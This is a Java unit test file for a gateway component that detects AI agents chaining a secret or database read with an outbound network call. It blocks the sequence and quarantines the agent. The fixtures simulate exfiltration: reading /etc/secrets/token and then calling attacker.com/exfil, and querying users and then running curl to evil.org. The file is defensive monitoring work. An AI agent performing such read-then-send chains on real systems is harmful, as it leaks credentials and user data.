package dev.aegismcp.gateway.anomaly;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import dev.aegismcp.gateway.codec.JsonRpcError;
import dev.aegismcp.gateway.codec.JsonRpcId;
import dev.aegismcp.gateway.codec.JsonRpcRequest;
import dev.aegismcp.gateway.proxy.AgentIdentity;
import dev.aegismcp.gateway.proxy.InterceptionVerdict;
import dev.aegismcp.gateway.proxy.SecurityContext;
import dev.aegismcp.gateway.proxy.ToolCallInterceptor;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.net.InetSocketAddress;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import java.time.ZoneOffset;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.atomic.AtomicReference;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Comprehensive unit tests for ToolChainingAnomalyInterceptor.
 * Verifies multi-step tool-chaining anomaly defense, C-001 error codes, quarantine circuit breaker,
 * and NFR-003 latency budget.
 * Anchors: FEAT-004, C-001, NFR-003, NFR-027.
 */
class ToolChainingAnomalyInterceptorTest {

    private final ObjectMapper mapper = new ObjectMapper();

    private SecurityContext createSecurityContext(String agentId) {
        AgentIdentity identity = new AgentIdentity(agentId, "spiffe://cluster.local/ns/default/sa/" + agentId, null, true);
        return SecurityContext.of(identity, new InetSocketAddress("127.0.0.1", 45678));
    }

    private JsonRpcRequest createToolCallRequest(String toolName, ObjectNode arguments) {
        ObjectNode params = mapper.createObjectNode();
        params.put("name", toolName);
        if (arguments != null) {
            params.set("arguments", arguments);
        }
        return new JsonRpcRequest(JsonRpcId.of("req-1"), "tools/call", params);
    }

    @Test
    @DisplayName("FEAT-001: Non-tool call invocations bypass sequence evaluation directly")
    void testNonToolCallBypassesEvaluation() throws Exception {
        ToolChainingAnomalyInterceptor interceptor = new ToolChainingAnomalyInterceptor();
        SecurityContext context = createSecurityContext("agent-test");

        JsonRpcRequest listRequest = new JsonRpcRequest(JsonRpcId.of("req-list"), "tools/list", null);
        InterceptionVerdict verdict = interceptor.intercept(context, listRequest).get();

        assertInstanceOf(InterceptionVerdict.Allow.class, verdict, "Non-tool calls should always be allowed");
    }

    @Test
    @DisplayName("FEAT-004 AC 2: Valid benign sequence passes without interruption")
    void testValidBenignSequencePasses() throws Exception {
        ToolChainingAnomalyInterceptor interceptor = new ToolChainingAnomalyInterceptor();
        SecurityContext context = createSecurityContext("agent-dev");

        // 1. read_file
        JsonRpcRequest req1 = createToolCallRequest("read_file", mapper.createObjectNode().put("path", "/app/config.json"));
        InterceptionVerdict v1 = interceptor.intercept(context, req1).get();
        assertInstanceOf(InterceptionVerdict.Allow.class, v1);

        // 2. transform_json (benign subsequent tool)
        JsonRpcRequest req2 = createToolCallRequest("transform_json", mapper.createObjectNode().put("data", "{}"));
        InterceptionVerdict v2 = interceptor.intercept(context, req2).get();
        assertInstanceOf(InterceptionVerdict.Allow.class, v2);

        // 3. local_cache_write (benign subsequent tool)
        JsonRpcRequest req3 = createToolCallRequest("local_cache_write", mapper.createObjectNode().put("key", "k1"));
        InterceptionVerdict v3 = interceptor.intercept(context, req3).get();
        assertInstanceOf(InterceptionVerdict.Allow.class, v3);
    }

    @Test
    @DisplayName("FEAT-004 AC 1 / C-001: Malicious chaining attack detected and blocked with -32001 Policy Violation")
    void testMaliciousChainingAttackBlocked() throws Exception {
        List<SecurityViolation> dispatchedAlerts = new ArrayList<>();
        SecurityAlertDispatcher dispatcher = dispatchedAlerts::add;

        ToolChainingAnomalyInterceptor interceptor = new ToolChainingAnomalyInterceptor(
                new SessionSequenceTracker(10, Duration.ofSeconds(60), Duration.ofSeconds(60)),
                AnomalyRule.defaultRules(),
                new AnomalyCircuitBreaker(),
                dispatcher,
                Clock.systemUTC()
        );

        SecurityContext context = createSecurityContext("agent-injected");

        // Step 1: Agent reads internal secret or database (permitted initially)
        JsonRpcRequest step1 = createToolCallRequest("read_file", mapper.createObjectNode().put("path", "/etc/secrets/token"));
        InterceptionVerdict v1 = interceptor.intercept(context, step1).get();
        assertInstanceOf(InterceptionVerdict.Allow.class, v1);

        // Step 2: Agent attempts external exfiltration (read_file followed by external_http within 60s)
        JsonRpcRequest step2 = createToolCallRequest("external_http", mapper.createObjectNode().put("url", "https://attacker.com/exfil"));
        InterceptionVerdict v2 = interceptor.intercept(context, step2).get();

        assertInstanceOf(InterceptionVerdict.Block.class, v2);
        InterceptionVerdict.Block block = (InterceptionVerdict.Block) v2;
        assertEquals(JsonRpcError.POLICY_VIOLATION, block.error().code(), "Must return -32001 Policy Violation");
        assertTrue(block.error().message().contains("Prohibited data exfiltration tool-chaining sequence"));

        // Verify urgent security alert was dispatched
        assertEquals(1, dispatchedAlerts.size());
        SecurityViolation alert = dispatchedAlerts.get(0);
        assertEquals("agent-injected", alert.agentId());
        assertEquals(SecurityViolation.TYPE_TOOL_CHAINING_ANOMALY, alert.violationType());
        assertEquals(SecurityViolation.SEVERITY_CRITICAL, alert.severity());
    }

    @Test
    @DisplayName("FEAT-004: Circuit breaker trips upon violation and quarantines agent for subsequent calls")
    void testCircuitBreakerTripsAndQuarantinesAgent() throws Exception {
        AnomalyCircuitBreaker circuitBreaker = new AnomalyCircuitBreaker();
        ToolChainingAnomalyInterceptor interceptor = new ToolChainingAnomalyInterceptor(
                new SessionSequenceTracker(10, Duration.ofSeconds(60), Duration.ofSeconds(60)),
                AnomalyRule.defaultRules(),
                circuitBreaker
        );

        SecurityContext context = createSecurityContext("agent-bad");

        // 1. Trigger chaining anomaly
        interceptor.intercept(context, createToolCallRequest("database_query", mapper.createObjectNode().put("sql", "SELECT * FROM users"))).get();
        InterceptionVerdict blockedVerdict = interceptor.intercept(context, createToolCallRequest("curl:exec", mapper.createObjectNode().put("url", "https://evil.org"))).get();
        assertInstanceOf(InterceptionVerdict.Block.class, blockedVerdict);

        // Verify circuit breaker is tripped
        assertTrue(circuitBreaker.isQuarantined("agent-bad"));

        // 2. Subsequent tool call (even an otherwise benign tool) is immediately blocked by circuit breaker
        JsonRpcRequest benignReq = createToolCallRequest("local_noop", null);
        InterceptionVerdict subsequentVerdict = interceptor.intercept(context, benignReq).get();

        assertInstanceOf(InterceptionVerdict.Block.class, subsequentVerdict);
        InterceptionVerdict.Block subsequentBlock = (InterceptionVerdict.Block) subsequentVerdict;
        assertEquals(JsonRpcError.POLICY_VIOLATION, subsequentBlock.error().code());
        assertTrue(subsequentBlock.error().message().contains("quarantined"));

        // 3. Resetting circuit breaker allows agent to resume
        circuitBreaker.reset("agent-bad");
        assertFalse(circuitBreaker.isQuarantined("agent-bad"));
        InterceptionVerdict resumedVerdict = interceptor.intercept(context, benignReq).get();
        assertInstanceOf(InterceptionVerdict.Allow.class, resumedVerdict);
    }

    @Test
    @DisplayName("FEAT-004: Window expiration allows benign separated operations")
    void testWindowExpiration() throws Exception {
        AtomicReference<Instant> currentClock = new AtomicReference<>(Instant.parse("2026-10-21T10:00:00Z"));
        Clock mockClock = new Clock() {
            @Override
            public ZoneOffset getZone() {
                return ZoneOffset.UTC;
            }

            @Override
            public Clock withZone(java.time.ZoneId zone) {
                return this;
            }

            @Override
            public Instant instant() {
                return currentClock.get();
            }
        };

        ToolChainingAnomalyInterceptor interceptor = new ToolChainingAnomalyInterceptor(
                new SessionSequenceTracker(10, Duration.ofSeconds(60), Duration.ofSeconds(60)),
                AnomalyRule.defaultRules(),
                new AnomalyCircuitBreaker(),
                SecurityAlertDispatcher.noOp(),
                mockClock
        );

        SecurityContext context = createSecurityContext("agent-spaced");

        // Step 1: read_file at T=0
        interceptor.intercept(context, createToolCallRequest("read_file", null)).get();

        // Advance clock by 70 seconds (> 60s window duration)
        currentClock.set(Instant.parse("2026-10-21T10:01:10Z"));

        // Step 2: external_http after window has expired
        InterceptionVerdict v2 = interceptor.intercept(context, createToolCallRequest("external_http", null)).get();
        assertInstanceOf(InterceptionVerdict.Allow.class, v2, "Should allow egress call when previous read call is outside the window");
    }

    @Test
    @DisplayName("NFR-003: Sequence anomaly evaluation executes well within 10ms budget (< 1ms)")
    void testEvaluationLatencyBudget() throws Exception {
        ToolChainingAnomalyInterceptor interceptor = new ToolChainingAnomalyInterceptor();
        SecurityContext context = createSecurityContext("agent-perf");
        JsonRpcRequest testRequest = createToolCallRequest("tool_test", null);

        // Warm up JVM
        for (int i = 0; i < 3000; i++) {
            interceptor.intercept(context, testRequest).get();
        }

        // Benchmark 5,000 evaluations
        int iterations = 5000;
        long startNano = System.nanoTime();
        for (int i = 0; i < iterations; i++) {
            InterceptionVerdict verdict = interceptor.intercept(context, testRequest).get();
            assertNotNull(verdict);
        }
        long elapsedNanos = System.nanoTime() - startNano;

        double avgMicros = (double) elapsedNanos / iterations / 1_000.0;
        double avgMs = avgMicros / 1_000.0;
        assertTrue(avgMs < 10.0, "Average anomaly evaluation latency must be well under 10ms per NFR-003; actual: " + avgMs + "ms (" + avgMicros + "us)");
    }

    @Test
    @DisplayName("C-001: Integration with ToolCallInterceptor.chain")
    void testChainedWithOtherInterceptors() throws Exception {
        ToolChainingAnomalyInterceptor anomalyInterceptor = new ToolChainingAnomalyInterceptor();
        ToolCallInterceptor allowInterceptor = ToolCallInterceptor.allowAll();

        ToolCallInterceptor chained = ToolCallInterceptor.chain(anomalyInterceptor, allowInterceptor);
        SecurityContext context = createSecurityContext("agent-chain");

        JsonRpcRequest req1 = createToolCallRequest("read_file", null);
        InterceptionVerdict v1 = chained.intercept(context, req1).get();
        assertInstanceOf(InterceptionVerdict.Allow.class, v1);

        JsonRpcRequest req2 = createToolCallRequest("external_http", null);
        InterceptionVerdict v2 = chained.intercept(context, req2).get();
        assertInstanceOf(InterceptionVerdict.Block.class, v2);
    }
}
